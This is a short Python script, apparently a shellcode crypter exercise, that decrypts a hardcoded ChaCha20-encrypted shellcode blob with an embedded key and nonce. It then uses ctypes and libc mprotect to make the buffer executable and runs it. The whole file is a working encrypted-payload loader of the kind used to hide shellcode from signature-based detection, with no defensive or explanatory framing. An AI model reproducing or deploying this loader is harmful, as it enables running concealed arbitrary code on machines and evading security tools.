#!/usr/bin/python3
from Crypto.Cipher import ChaCha20
import ctypes

# setting data
encryptedShell = b'\xf9\x60\x94\xb7\x68\xb8\xe8\x8b\xf5\x88\xf7\x52\x8c\xf0\xad\x04\x2b\x6f\x69\x50\x81\x94\xd2\x36\x75'
key = bytearray.fromhex("a2ffacb58c5457e09915b870ca18af0d51414021cabcd2d46565efc2d757fd31")
nonce = bytearray.fromhex("b79267fb237543ca8e797968")

# decrypt
cipher = ChaCha20.new(key=key, nonce=nonce)
decryptedShell = cipher.decrypt(encryptedShell)

# format in shellcode format
decyptedShellOutput = ''.join(f'\\x{byte:02x}'for byte in decryptedShell)

print("The encrypted shellcode is " + decyptedShellOutput + " is now executed")


# Exec Shellcode
shellcode = ctypes.create_string_buffer(decryptedShell)
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(decryptedShell), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0

function()